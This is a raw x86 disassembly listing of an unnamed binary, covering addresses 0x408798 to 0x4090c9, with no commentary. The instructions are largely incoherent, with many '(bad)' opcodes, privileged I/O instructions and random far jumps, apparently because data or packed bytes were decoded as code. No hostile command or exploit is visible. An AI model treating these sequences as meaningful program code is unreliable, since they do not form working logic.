  408798:	lea    ecx,[edi]
  40879a:	mov    ds:0xca5f82ff,al
  40879f:	add    al,0x0
	...
  4087b1:	add    BYTE PTR [eax],al
  4087b3:	add    ch,dh
  4087b5:	ret    0xec81
  4087b8:	je     0x408816
  4087ba:	shl    bh,1
  4087bc:	add    dl,BYTE PTR [ebp-0x7b]
  4087bf:	inc    ebp
  4087c0:	loope  0x408789
  4087c2:	cmc    
  4087c3:	jne    0x4087a6
  4087c5:	push   esp
  4087c6:	cmp    eax,0xf6d79dd3
  4087cb:	out    0x93,eax
  4087cd:	invd   
  4087cf:	add    dh,ch
  4087d1:	push   edi
  4087d2:	pop    es
  4087d3:	test   DWORD PTR [eax],eax
  4087d5:	xchg   edi,eax
  4087d6:	or     BYTE PTR [eax],al
  4087d8:	jmp    0x897:0xa500fed2
  4087df:	(bad)  
  4087e0:	push   0xb507f76c
  4087e5:	xchg   edi,eax
  4087e6:	bound  eax,QWORD PTR [eax]
  4087e8:	jg     0x40877a
  4087ea:	bound  eax,QWORD PTR [eax]
  4087ec:	mov    WORD PTR [edi+0x1498d0c],ss
  4087f2:	fisttp DWORD PTR [ecx+edx*1-0x7c00cfd7]
  4087f9:	lea    ecx,[ecx+0x75]
  4087fc:	je     0x408820
  4087fe:	mov    esi,0x91bd64fb
  408803:	add    BYTE PTR [esi+eiz*4+0x4489744a],cl
  40880a:	fwait
  40880b:	add    DWORD PTR [ebp+edi*4-0x33b515e],ecx
  408812:	or     bh,bh
  408814:	shl    DWORD PTR [ecx+0x5122],0x0
	...
  40882b:	add    ah,bh
  40882d:	imul   ecx,DWORD PTR [eax+0x50],0x85868d07
  408834:	cmp    BYTE PTR [edx+0x48],ah
  408837:	(bad)  
  408838:	mov    esp,0xdc4122ef
  40883d:	mov    DWORD PTR [eax-0x77],ecx
  408840:	adc    DWORD PTR [ebp-0x6aec00d0],ecx
  408846:	nop
  408847:	lods   al,BYTE PTR ds:[esi]
  408848:	or     edx,DWORD PTR [edx-0x5e1b7a7a]
  40884e:	call   FWORD PTR ss:[ebp+edx*1+0x3e]
  408853:	pop    ecx
  408854:	dec    ebp
  408855:	mov    ebp,0xc9dcb547
  40885a:	ss jmp ebx
  40885d:	jg     0x4088ba
  40885f:	dec    eax
  408860:	dec    ebp
  408861:	mov    ebp,0xda239222
  408866:	mov    DWORD PTR ss:[ecx],edx
  408869:	fnstcw WORD PTR [esi]
  40886b:	inc    ebx
  40886d:	inc    esi
  40886e:	or     al,0x68
  408870:	scas   eax,DWORD PTR es:[edi]
  408871:	or     ebp,0xffffffff
  408874:	mov    dl,0x1f
  408876:	cmp    al,0xf7
  408878:	stos   DWORD PTR es:[edi],eax
  408879:	xchg   ebx,eax
  40887a:	scas   al,BYTE PTR es:[edi]
  40887b:	aas    
  40887c:	pop    ecx
  40887d:	(bad)  
  40887e:	cmp    ch,al
  408880:	fwait
  408881:	mov    dl,0x14
  408883:	outs   dx,DWORD PTR ds:[esi]
  408884:	xchg   ebx,eax
  408885:	stos   BYTE PTR es:[edi],al
  408886:	mov    DWORD PTR [bx+si-0x5e],edi
  40888a:	lea    edi,[edi]
  40888c:	not    BYTE PTR [ecx+ebx*1+0x30]
	...
  4088a3:	add    ch,dl
  4088a5:	push   ebx
  4088a6:	loope  0x4088e6
  4088a8:	cmp    DWORD PTR [ebp-0x5594c083],esp
  4088ae:	adc    edx,DWORD PTR [ebx-0x2c]
  4088b1:	push   ebx
  4088b2:	loope  0x4088df
  4088b4:	ret    0x5df9
  4088b7:	aas    
  4088b8:	add    eax,0x4b374910
  4088bd:	stos   BYTE PTR es:[edi],al
  4088be:	jnp    0x408849
  4088c0:	pusha  
  4088c1:	mov    ds:0x3cdc3f35,al
  4088c6:	aas    
  4088c7:	(bad)  
  4088c9:	xchg   esp,eax
  4088ca:	es jns 0x4088e9
  4088cd:	mov    ds:0x60233f2d,al
  4088d2:	xor    cl,ah
  4088d4:	int3   
  4088d5:	xchg   esp,eax
  4088d6:	or     ebx,esi
  4088d8:	loop   0x408883
  4088da:	add    eax,0xe820cc0b
  4088df:	add    BYTE PTR [ecx-0x37],0xfd
  4088e3:	ds sti 
  4088e5:	nop
  4088e6:	je     0x4088fb
  4088e8:	repz fs push esi
  4088eb:	mov    esp,ebp
  4088ed:	mov    eax,ds:0xbc3c3eed
  4088f2:	loopne 0x408963
  4088f4:	fld    TBYTE PTR [ecx-0x2b78e837]
  4088fa:	pop    esp
  4088fb:	push   es
  4088fc:	pop    esp
  4088fd:	mov    esp,0xa9c36ab4
  408902:	lods   eax,DWORD PTR ds:[esi]
  408903:	mov    BYTE PTR [ecx+eiz*4+0xb607],ch
	...
  40891a:	add    BYTE PTR [eax],al
  40891c:	jb     0x40899d
  40891e:	or     cl,ch
  408920:	(bad)  
  408921:	adc    eax,0xa95a8db5
  408926:	imul   cl
  408928:	jecxz  0x408951
  40892a:	mov    edx,DWORD PTR [ebx+eiz*2-0x5f]
  40892e:	test   BYTE PTR [esi+0x6a7d208f],0xc
  408935:	mov    esp,0x94ba7efe
  40893a:	jl     0x408941
  40893c:	es test eax,0xa1c76483
  408942:	mul    BYTE PTR [esi+0x3f]
  408945:	stos   BYTE PTR es:[edi],al
  408946:	mov    esp,0xf6a9a245
  40894b:	inc    ecx
  40894c:	push   edi
  40894d:	shl    dh,0x4e
  408950:	xchg   esi,eax
  408951:	aam    0x7b
  408953:	popf   
  408954:	push   cs
  408955:	out    0xcf,eax
  408957:	ss jp  0x408903
  40895a:	pop    es
  40895b:	mov    ebp,0xe9083146
  408960:	jp     0x40894c
  408962:	neg    BYTE PTR [edi+edx*4+0x5a5159bc]
  408969:	test   eax,0xa1635cf6
  40896e:	test   BYTE PTR [esi],0xca
  408971:	pop    ds
  408972:	add    BYTE PTR [ecx],dl
  408974:	imul   edi,esp,0xdfb9fef6
  40897a:	(bad)  
  40897c:	mov    cl,0xa9
  40897e:	div    BYTE PTR [eax+eax*1+0x0]
	...
  408992:	add    BYTE PTR [eax],al
  408994:	xchg   edi,eax
  408995:	mov    esp,0xa9a1918f
  40899a:	not    BYTE PTR [eax+edi*1-0x6e29095f]
  4089a1:	fucomip st,st(3)
  4089a3:	(bad)  
  4089a4:	mov    DWORD PTR [ecx-0x677fff0a],ebp
  4089aa:	loopne 0x408a04
  4089ac:	sbb    eax,0x30fff767
  4089b1:	jo     0x4089b2
  4089b3:	(bad)  
  4089b4:	cli    
  4089b5:	data16 jge 0x4089c0
  4089b8:	std    
  4089b9:	mov    esp,DWORD PTR [eax-0x42990501]
  4089bf:	in     al,0xf2
  4089c1:	imul   ax
  4089c4:	mov    ebp,0xafff73d
  4089c9:	and    ah,ah
  4089cb:	idiv   edx
  4089cd:	imul   esp,eax,0xf769ce4d
  4089d3:	jmp    DWORD PTR [eax-0x15000088]
  4089d9:	js     0x408a25
  4089db:	stos   DWORD PTR es:[edi],eax
  4089dc:	mov    edx,0xb5b5f769
  4089e1:	popa   
  4089e2:	idiv   edi
  4089e4:	int    0xa1
  4089e6:	mov    eax,ds:0x4d69caff
  4089eb:	clc    
  4089ec:	(bad)  
  4089ee:	hlt    
  4089ef:	(bad)  
  4089f0:	jp     0x408a5b
  4089f2:	jge    0x4089f0
  4089f4:	int    0xc5
  4089f6:	popf   
	...
  408a0b:	add    BYTE PTR ds:0x2508ca5b,dh
  408a11:	mov    edi,0x5ca6ec81
  408a16:	cld    
  408a17:	jmp    DWORD PTR [eax]
  408a19:	cwde   
  408a1a:	loopne 0x408a07
  408a1c:	pusha  
  408a1d:	nop
  408a1e:	or     BYTE PTR [ecx+0x75f76c30],cl
  408a24:	std    
  408a25:	jnp    0x408a50
  408a27:	stos   DWORD PTR es:[edi],eax
  408a28:	cli    
  408a29:	push   0x68e94581
  408a2e:	jge    0x408a2c
  408a30:	mov    edx,0x8cfffede
  408a35:	dec    eax
  408a36:	sbb    al,ch
  408a38:	test   esi,edi
  408a3a:	xor    edi,edi
  408a3c:	xchg   edi,eax
  408a3d:	std    
  408a3e:	mov    esi,0x3071053d
  408a43:	push   0xffffff8c
  408a45:	xor    dh,cl
  408a47:	repz cmp al,0xf6
  408a4a:	mov    ebp,0x509cb4fb
  408a4f:	call   FWORD PTR [ebx+0x65744aa2]
  408a55:	xchg   ebp,eax
  408a56:	or     al,0x10
  408a58:	jnp    0x408ab1
  408a5a:	xor    al,0x75
  408a5c:	xchg   esp,eax
  408a5d:	add    eax,0x267ba78f
  408a62:	xor    al,0x75
  408a64:	je     0x408a84
  408a66:	mov    esi,0x2a06b0b
  408a6b:	call   0xff74a0a0
	...
  408a84:	pop    ebx
  408a85:	sar    BYTE PTR [esi],0xff
  408a88:	fld    DWORD PTR [ecx+0x34]
  408a8b:	jne    0x408a21
  408a8d:	push   ebp
  408a8e:	xchg   ebp,eax
  408a8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a90:	inc    ebx
  408a91:	dec    esi
  408a92:	xor    al,0x75
  408a94:	cmp    BYTE PTR [ebp+0x64],al
  408a97:	stos   BYTE PTR es:[edi],al
  408a98:	xor    ebx,DWORD PTR [esi+0x42]
  408a9b:	ret    0xbd94
  408a9e:	fisttp QWORD PTR [edx-0x17b0c5d0]
  408aa4:	ret    0xbe86
  408aa7:	or     esp,DWORD PTR [esp+eax*1]
  408aaa:	dec    DWORD PTR fs:[ebx]
  408aad:	mov    dl,0x4a
  408aaf:	jne    0x408a3a
  408ab1:	out    dx,eax
  408ab2:	inc    ecx
  408ab3:	ret    0xbd84
  408ab6:	test   DWORD PTR [ebp-0x4],eax
  408ab9:	or     al,0x34
  408abb:	jne    0x408a55
  408abd:	xchg   ebp,eax
  408abe:	loopne 0x408a6f
  408ac0:	jecxz  0x408a55
  408ac2:	out    dx,al
  408ac3:	bswap  esp
  408ac5:	xchg   esi,eax
  408ac6:	ins    DWORD PTR es:[edi],dx
  408ac7:	sahf   
  408ac8:	mov    WORD PTR [ecx+eiz*8-0x3757bec6],ss
  408acf:	mov    dh,dh
  408ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ad2:	int    0x8d
  408ad4:	push   ecx
  408ad5:	mov    eax,0xa6b7b1b5
  408ada:	xor    ebp,DWORD PTR [eax]
  408adc:	stos   DWORD PTR es:[edi],eax
  408add:	and    BYTE PTR [ecx-0x520627d4],bh
  408ae3:	cmp    eax,DWORD PTR [edi]
  408ae5:	and    DWORD PTR [ebp+0x2f],eax
	...
  408afb:	add    BYTE PTR [ebp+0x3c],al
  408afe:	(bad)  
  408aff:	(bad)  
  408b01:	xchg   esp,eax
  408b02:	aas    
  408b03:	sub    al,0x60
  408b05:	jmp    eax
  408b07:	add    eax,DWORD PTR [edi+0x6705fbd4]
  408b0d:	push   0x5df4346a
  408b12:	sbb    eax,ebp
  408b14:	arpl   WORD PTR [esi-0x6b736ef6],bp
  408b1a:	loop   0x408b4f
  408b1c:	add    eax,0xd1ac4920
  408b21:	dec    edx
  408b22:	mov    al,ds:0x8abcda03
  408b27:	xchg   edx,eax
  408b28:	mov    WORD PTR [edx+edi*8+0x4a92b943],ss
  408b2f:	pop    ds
  408b30:	push   ss
  408b31:	test   DWORD PTR [edi],ebp
  408b33:	add    al,0x8c
  408b35:	inc    esp
  408b36:	mov    bl,0x3a
  408b38:	mov    eax,ds:0x8bb115bc
  408b3d:	mov    esp,0xa60b3a17
  408b42:	mov    edx,0x61850bdb
  408b47:	cli    
  408b48:	sti    
  408b49:	and    BYTE PTR [ebx],dh
  408b4b:	lods   al,BYTE PTR ds:[esi]
  408b4c:	mov    WORD PTR [eax+ecx*1+0x7ca56606],es
  408b53:	loope  0x408b0c
  408b55:	(bad)  [ebp+0x7ca596e6]
  408b5b:	fst    QWORD PTR [esi+0xd6e41f]
	...
  408b71:	add    BYTE PTR [eax],al
  408b73:	add    ah,bh
  408b75:	(bad)  
  408b76:	loopne 0x408b26
  408b78:	sub    eax,0xfcc6f6a5
  408b7d:	mov    ecx,0xa520b9df
  408b82:	mul    BYTE PTR [esp+ecx*8-0x4b]
  408b86:	push   edi
  408b87:	rol    DWORD PTR [esi+0x6aa6f6e4],0x94
  408b8e:	push   esi
  408b8f:	mov    al,0x49
  408b91:	pushf  
  408b92:	or     BYTE PTR [ebx+ebx*1],bh
  408b95:	mov    eax,0x3abba58a
  408b9a:	or     BYTE PTR [ebx],dl
  408b9c:	popf   
  408b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b9e:	jl     0x408b91
  408ba0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ba1:	mov    gs,WORD PTR [edi+0x4d1ba676]
  408ba7:	ins    DWORD PTR es:[edi],dx
  408ba8:	aaa    
  408ba9:	xchg   edx,eax
  408baa:	push   edx
  408bab:	test   al,0x8f
  408bad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bae:	jl     0x408ba1
  408bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bb1:	in     eax,dx
  408bb2:	repz push esi
  408bb4:	xchg   BYTE PTR [edx],bh
  408bb6:	or     cl,al
  408bb8:	fs dec ebx
  408bba:	dec    ecx
  408bbb:	jmp    0xa892e7a7
  408bc0:	(bad)  
  408bc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bc2:	cmp    al,0x1a
  408bc4:	push   edi
  408bc5:	push   esp
  408bc6:	or     BYTE PTR [ecx-0x5a],al
  408bc9:	clc    
  408bca:	mul    BYTE PTR [esi]
  408bcc:	mov    dl,ah
  408bce:	jnp    0x408bd3
  408bd0:	loopne 0x408c4a
  408bd2:	push   edx
  408bd3:	test   al,0x8f
  408bd5:	inc    esp
  408bd6:	loopne 0x408c3a
	...
  408bec:	je     0x408b93
  408bee:	test   BYTE PTR [eax],0x15
  408bf1:	shl    ebp,0x75
  408bf4:	std    
  408bf5:	js     0x408be2
  408bf7:	(bad)  
  408bf8:	loop   0x408c64
  408bfa:	loopne 0x408b85
  408bfc:	dec    esp
  408bfd:	push   0xfffffff7
  408bff:	push   0xffffff8f
  408c01:	js     0x408bd5
  408c03:	lods   eax,DWORD PTR ds:[esi]
  408c04:	mov    dl,0x6a
  408c06:	add    eax,eax
  408c08:	imul   eax,ebp,0xd17f206e
  408c0e:	test   BYTE PTR [edi-0x23],0xf1
  408c12:	mov    ds:0x22f7f2ff,eax
  408c17:	pop    edx
  408c18:	je     0x408baa
  408c1a:	pop    eax
  408c1b:	call   0x37b99e
  408c20:	push   ebp
  408c21:	shl    ch,0x75
  408c24:	popf   
  408c25:	js     0x408be2
  408c27:	(bad)  
  408c28:	and    bl,BYTE PTR [esi-0x20]
  408c2b:	pop    ecx
  408c2c:	int3   
  408c2d:	pop    ebp
  408c2e:	imul   DWORD PTR [edx+0x71]
  408c31:	jo     0x408bd5
  408c33:	lods   eax,DWORD PTR ds:[esi]
  408c34:	repnz pop ebp
  408c36:	add    eax,eax
  408c38:	imul   eax,ebx,0xd77f206e
  408c3e:	test   BYTE PTR [edi-0x43],0xa6
  408c42:	mov    ds:0x22f0b2ff,eax
  408c47:	pop    edx
  408c48:	hlt    
  408c49:	xchg   edi,eax
  408c4a:	pop    eax
  408c4b:	call   0x37c7de
	...
  408c64:	adc    eax,0x3d75f5c8
  408c69:	jo     0x408bf6
  408c6b:	(bad)  
  408c6c:	bound  ebx,QWORD PTR [ebp-0x20]
  408c6f:	sub    DWORD PTR [esi+ebx*2],ecx
  408c72:	imul   DWORD PTR [edx+0x46]
  408c75:	jo     0x408ce9
  408c77:	lods   eax,DWORD PTR ds:[esi]
  408c78:	jb     0x408cd7
  408c7a:	add    eax,eax
  408c7c:	mov    WORD PTR [ecx],es
  408c7e:	(bad)  
  408c7f:	lods   al,BYTE PTR ds:[si]
  408c81:	out    0xc9,eax
  408c83:	dec    DWORD PTR [ebx-0x7b]
  408c86:	or     ch,BYTE PTR [ebp+0x2ba2a2f3]
  408c8c:	inc    esi
  408c8d:	in     al,dx
  408c8e:	or     dl,BYTE PTR [eax-0xc]
  408c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c92:	outs   dx,BYTE PTR ds:[esi]
  408c93:	(bad)  
  408c94:	fistp  DWORD PTR [ebp-0x24]
  408c97:	(bad)  
  408c98:	pop    ecx
  408c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c9a:	and    dl,BYTE PTR [ebx-0x36]
  408c9d:	retf   0xe82f
  408ca0:	lds    edx,FWORD PTR ds:0x60bbff30
  408ca6:	xor    bh,bh
  408ca8:	cmp    DWORD PTR [ebp-0x150d93de],esp
  408cae:	das    
  408caf:	leave  
  408cb0:	into   
  408cb1:	mov    ecx,0xa07550a
  408cb6:	mov    al,ah
  408cb8:	mov    al,0xa
  408cba:	xor    bh,bh
  408cbc:	sbb    DWORD PTR [eax+0x30],esi
  408cbf:	push   eax
  408cc0:	or     DWORD PTR [eax-0x55fe00e4],0x22
  408cc7:	add    al,0x0
	...
  408cd9:	add    BYTE PTR [eax],al
  408cdb:	add    BYTE PTR [ecx],bl
  408cdd:	lods   eax,DWORD PTR ds:[esi]
  408cde:	or     cl,BYTE PTR [ebx]
  408ce0:	dec    esp
  408ce1:	mov    edx,0xad8dbe75
  408ce6:	or     al,bh
  408ce8:	shl    DWORD PTR ds:0xad8c000b,1
  408cee:	inc    edi
  408cef:	inc    ebp
  408cf0:	inc    eax
  408cf1:	dec    edx
  408cf2:	or     BYTE PTR [eax],al
  408cf4:	mov    edi,ss
  408cf6:	or     ch,BYTE PTR [edx-0x74]
  408cf9:	(bad)  
  408cfa:	or     ch,BYTE PTR [edx-0x74]
  408cfd:	xor    BYTE PTR [esi+0x7638bcf3],dh
  408d03:	hlt    
  408d04:	sbb    esi,DWORD PTR [edx+0x30]
  408d07:	push   eax
  408d08:	sbb    edx,DWORD PTR [esp+edx*4+0x1529133b]
  408d0f:	sub    esp,edx
  408d11:	pop    es
  408d12:	loope  0x408d17
  408d14:	xchg   edi,eax
  408d15:	aam    0x9c
  408d17:	(bad)  
  408d18:	in     al,0x14
  408d1a:	loopne 0x408d1f
  408d1c:	mov    WORD PTR [esi+eax*2],gs
  408d1f:	retf   
  408d20:	dec    esp
  408d21:	xchg   esp,eax
  408d22:	(bad)  
  408d23:	lods   eax,DWORD PTR ds:[esi]
  408d24:	xchg   ebx,eax
  408d25:	lods   al,BYTE PTR ds:[esi]
  408d26:	int    0x67
  408d28:	(bad)  [edx+0x10bc8b30]
  408d2e:	ins    BYTE PTR es:[edi],dx
  408d2f:	xor    bl,al
  408d31:	mov    ds:0xac5dd4dd,al
  408d36:	std    
  408d37:	addr16 mov ebx,0xbc8177a2
  408d3d:	stos   BYTE PTR es:[edi],al
  408d3e:	mov    ch,0x37
	...
  408d54:	mov    ah,0x30
  408d56:	mov    DWORD PTR [edi],esi
  408d58:	mov    ds:0x18abe12d,eax
  408d5d:	and    BYTE PTR ds:[ebx+edx*4],al
  408d61:	call   0xa2cbbcf6
  408d66:	popf   
  408d67:	mov    cl,0x97
  408d69:	lods   al,BYTE PTR ds:[esi]
  408d6a:	adc    BYTE PTR [ebx+0x7b],ch
  408d6d:	mov    ds:0xaa688177,al
  408d72:	jne    0x408dab
  408d74:	not    BYTE PTR [ecx+ecx*1-0x1eac3982]
  408d7b:	and    DWORD PTR ss:[ebp-0x5dacc8ab],esp
  408d82:	fild   DWORD PTR [edi]
  408d84:	xor    al,0x48
  408d86:	mov    dh,BYTE PTR [edi]
  408d88:	inc    ebx
  408d89:	or     al,0x6c
  408d8b:	and    al,0x43
  408d8d:	mov    ds:0x3a33aa4d,al
  408d92:	(bad)  
  408d93:	fxch   st(4)
  408d95:	xchg   esp,eax
  408d96:	or     BYTE PTR [esi],dh
  408d98:	popf   
  408d99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d9a:	(bad)  
  408d9b:	arpl   WORD PTR cs:[ecx+0x5e67f57c],sp
  408da2:	mov    ds:0x8d0bc31e,eax
  408da7:	add    eax,0x83f6a1b3
  408dac:	(bad)  
  408dad:	sub    al,0x7c
  408daf:	mov    ds:0x34f5a1c8,eax
  408db4:	mov    al,ds:0xf6f6a9
	...
  408dc9:	add    BYTE PTR [eax],al
  408dcb:	add    BYTE PTR [edx-0x7cfefbd9],bl
  408dd1:	in     eax,dx
  408dd2:	mul    dh
  408dd4:	add    BYTE PTR [eax],bl
  408dd6:	loopne 0x408dae
  408dd8:	and    BYTE PTR [ecx+0x11f7e961],0x52
  408ddf:	sub    BYTE PTR [eax+0x62b9bca1],dl
  408de5:	mov    eax,ds:0x8ddcbef6
  408dea:	loopne 0x408dd9
  408dec:	mov    eax,ss:0xc10c60f6
  408df2:	(bad)  
  408df3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408df4:	pop    edx
  408df5:	adc    eax,0xa1ba85b5
  408dfa:	imul   cl
  408dfc:	cmp    al,0x8c
  408dfe:	mov    ecx,DWORD PTR [edi+ebp*4-0x57]
  408e02:	test   BYTE PTR [esi+0x6a6d288f],0xe4
  408e09:	mov    al,0xfe
  408e0b:	jbe    0x408da7
  408e0d:	xchg   esp,eax
  408e0e:	jl     0x408e1d
  408e10:	pandn  mm3,mm7
  408e13:	pop    esi
  408e14:	call   0x839:0x5ed507a1
  408e1b:	jmp    0xd537708a
  408e20:	xchg   DWORD PTR [ebp+ebp*2-0x895ff00],ebp
  408e27:	jmp    DWORD PTR [eax+0x5affff79]
  408e2d:	push   0x7d
  408e2f:	or     BYTE PTR [eax],al
	...
  408e41:	add    BYTE PTR [eax],al
  408e43:	add    ch,cl
  408e45:	sbb    ebp,DWORD PTR [edi+edi*8-0x17429596]
  408e4c:	mov    ds:0x20fff76a,al
  408e51:	(bad)  
  408e52:	loopne 0x408e00
  408e54:	push   ecx
  408e55:	push   0xfffffff7
  408e57:	push   DWORD PTR [eax-0x1500007f]
  408e5d:	data16 jge 0x408e68
  408e60:	lea    eax,[edi]
  408e62:	lods   al,BYTE PTR ds:[esi]
  408e63:	(bad)  
  408e64:	jmp    0xf766:0xb2e0bd66
  408e6b:	jmp    DWORD PTR [eax-0x70]
  408e6e:	loopne 0x408e00
  408e70:	adc    DWORD PTR [edi-0x9],esp
  408e73:	jmp    DWORD PTR [eax]
  408e75:	cmp    al,0xff
  408e77:	dec    edx
  408e79:	data16 jge 0x408e84
  408e7c:	mov    ebp,0xdaffac15
  408e81:	mov    bp,0xe2e4
  408e85:	imul   ax
  408e88:	cmp    DWORD PTR [edi],0x302afff7
  408e8e:	call   0xe0aaa98a
  408e93:	pop    ecx
  408e94:	shr    BYTE PTR [ecx-0x9],cl
  408e97:	push   DWORD PTR [eax-0x15000094]
  408e9d:	jo     0x408ee5
  408e9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ea0:	fisubr DWORD PTR [ecx-0x9]
  408ea3:	mov    ch,0xd
  408ea5:	jb     0x408e9e
  408ea7:	inc    DWORD PTR [eax]
	...
  408eb9:	add    BYTE PTR [eax],al
  408ebb:	add    BYTE PTR [ebp-0x1500522b],bh
  408ec1:	imul   edi,DWORD PTR [ebp+0x3d3e8cdc],0x558624ff
  408ecb:	push   DWORD PTR [ebx]
  408ecd:	push   edi
  408ece:	lock and ebx,DWORD PTR [bx+0x3d]
  408ed3:	call   FWORD PTR [ecx-0x7b8ac447]
  408ed9:	push   ebp
  408eda:	(bad)  
  408edb:	std    
  408edc:	adc    esi,DWORD PTR [edi+0x3d]
  408edf:	mov    ch,0xfc
  408ee1:	xchg   BYTE PTR ds:0x53a9f4ff,bh
  408ee7:	(bad)  
  408ee8:	sti    
  408ee9:	mov    ?,WORD PTR [edi+0x3cfce5f7]
  408eef:	(bad)  
  408ef0:	jmp    0x408e90
  408ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ef3:	sti    
  408ef4:	hlt    
  408ef5:	in     eax,0x97
  408ef7:	add    BYTE PTR [esp+esi*2+0x608c0c4a],cl
  408efe:	sub    esp,0x6a3efa0f
  408f04:	mov    WORD PTR [ebx+0x6],ss
  408f07:	inc    DWORD PTR [ecx-0x4b]
  408f0a:	and    ch,BYTE PTR [esi]
  408f0c:	call   0x51c9cae7
  408f11:	loope  0x408eb5
  408f13:	cdq    
  408f14:	inc    esi
  408f15:	ins    BYTE PTR es:[edi],dx
  408f16:	or     al,0x68
  408f18:	mov    gs,WORD PTR [ebp-0x7f6c7ff6]
  408f1e:	add    al,0xe8
	...
  408f34:	add    DWORD PTR [eax],0x3c
  408f37:	push   esp
  408f39:	and    edx,ecx
  408f3b:	inc    eax
  408f3c:	mov    WORD PTR [esi],cs
  408f3e:	out    0xd2,al
  408f40:	les    ebp,FWORD PTR [esp+ecx*1-0x1]
  408f44:	loope  0x408eeb
  408f46:	and    ah,ah
  408f48:	popa   
  408f49:	es cmp al,0xff
  408f4c:	loope  0x408f7f
  408f4e:	cmp    al,0x75
  408f50:	test   BYTE PTR [ecx+ebx*2+0x559eefc2],dl
  408f57:	dec    edx
  408f58:	dec    esi
  408f59:	cwde   
  408f5a:	loope  0x408f2a
  408f5c:	push   es
  408f5d:	mov    al,0x5f
  408f5f:	aas    
  408f60:	push   eax
  408f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f62:	dec    ebp
  408f63:	xor    al,0x19
  408f65:	pop    ecx
  408f66:	xor    eax,0xd12922d3
  408f6b:	xor    al,0xa1
  408f6d:	nop
  408f6e:	dec    ecx
  408f6f:	pop    edx
  408f70:	(bad)  
  408f71:	xchg   ebx,eax
  408f72:	loope  0x408f7c
  408f74:	int3   
  408f75:	mov    gs,WORD PTR [ebp+esi*2-0x73]
  408f79:	xchg   esp,eax
  408f7a:	loope  0x408fb8
  408f7c:	push   ecx
  408f7d:	pushf  
  408f7e:	loopne 0x408f83
  408f80:	mov    WORD PTR [esi+eiz*1-0x12612042],ss
  408f87:	add    ecx,DWORD PTR [edx+ebp*1+0x2cdba9e1]
  408f8e:	loope  0x408f39
  408f90:	ror    DWORD PTR [edi],cl
  408f92:	and    al,0x38
  408f94:	pop    esp
  408f95:	adc    DWORD PTR [eax+edi*1+0x0],ebp
	...
  408fa9:	add    BYTE PTR [eax],al
  408fab:	add    BYTE PTR [ebx-0x452b2262],bh
  408fb1:	sub    cl,bl
  408fb3:	xor    edi,DWORD PTR [ecx]
  408fb5:	mov    al,ds:0x93fe5fd8
  408fba:	loope  0x408fba
  408fbc:	jecxz  0x408fe5
  408fbe:	in     al,0x1c
  408fc0:	or     eax,0x2403e195
  408fc5:	out    dx,eax
  408fc6:	cmp    ch,al
  408fc8:	mov    ebx,DWORD PTR [edi-0x5e8bebe5]
  408fce:	inc    edi
  408fcf:	xor    edi,DWORD PTR [ebx+0x45]
  408fd2:	push   0x54
  408fd4:	add    DWORD PTR [eax],ebx
  408fd6:	jne    0x409013
  408fd8:	imul   ebx,DWORD PTR [esi-0x4e9429f0],0x7
  408fdf:	inc    eax
  408fe0:	lahf   
  408fe1:	popf   
  408fe2:	and    BYTE PTR [eax+ebx*4-0x5b],0xf6
  408fe7:	data16 test al,0x52
  408fea:	scas   al,BYTE PTR es:[edi]
  408feb:	pop    esi
  408fec:	jg     0x409018
  408fee:	or     cl,al
  408ff0:	fdivr  QWORD PTR [edx]
  408ff2:	dec    ecx
  408ff3:	jmp    0x3f387776
  408ff8:	pop    edi
  408ff9:	popf   
  408ffa:	div    BYTE PTR [ebx+eiz*1+0x5f804cb6]
  409001:	popf   
  409002:	and    BYTE PTR [esp+eiz*2-0x5b],0xf6
  409007:	sub    bl,BYTE PTR es:[esi+0x54d2106e]
  40900e:	or     BYTE PTR [esi],dl
	...
  409024:	jne    0x408fca
  409026:	dec    BYTE PTR [esi]
  409028:	mov    edi,0x87f57c9d
  40902d:	push   0xffffffa1
  40902f:	(bad)  
  409030:	sahf   
  409031:	or     ecx,DWORD PTR [ebp-0x96268f7]
  409037:	or     DWORD PTR [edi-0x2ebc30d4],0xffffff9d
  40903e:	cmc    
  40903f:	xchg   esp,eax
  409040:	jg     0x408fe7
  409042:	not    dh
  409044:	jle    0x40906d
  409046:	add    al,0xc1
  409048:	mov    gs,ebx
  40904a:	test   dh,0x28
  40904d:	pop    ss
  40904e:	in     al,0xb6
  409050:	pop    esi
  409051:	popf   
  409052:	popa   
  409053:	jmp    0x2892554f
  409058:	mov    BYTE PTR [ebp-0x62396644],bl
  40905e:	neg    BYTE PTR [esi-0x621f76bc]
  409064:	xlat   BYTE PTR ds:[ebx]
  409065:	popf   
  409066:	mul    BYTE PTR [eax+0x4]
  409069:	lods   al,BYTE PTR ds:[esi]
  40906a:	inc    BYTE PTR [eax]
  40906c:	adc    ah,BYTE PTR [edx+0x62]
  40906f:	add    BYTE PTR [ebp+0x5a],bh
  409072:	push   edx
  409073:	inc    ecx
  409074:	bound  edi,QWORD PTR gs:[ebp-0x89d2510]
  40907b:	jmp    FWORD PTR [eax-0x63]
  40907e:	out    dx,al
  40907f:	fstp   DWORD PTR ds:0xa889f762
  409085:	dec    ebp
  409086:	(bad)  
  409087:	inc    DWORD PTR [eax]
	...
  409099:	add    BYTE PTR [eax],al
  40909b:	add    dl,al
  40909d:	push   ss
  40909e:	mov    ch,0xe4
  4090a0:	push   0x62
  4090a2:	test   DWORD PTR [eax],0xbd899fd8
  4090a8:	lds    ebx,FWORD PTR [edx-0x9]
  4090ab:	jmp    DWORD PTR ds:0x70836be5
  4090b1:	jge    0x4090b2
  4090b3:	jmp    DWORD PTR [edx+0x665c7c91]
  4090b9:	and    al,0xe0
  4090bb:	test   DWORD PTR [edx+0x6740862],0x92fff6f9
  4090c5:	and    esi,edi
  4090c7:	jne    0x4090b6
  4090c9:	js     0x4090fe
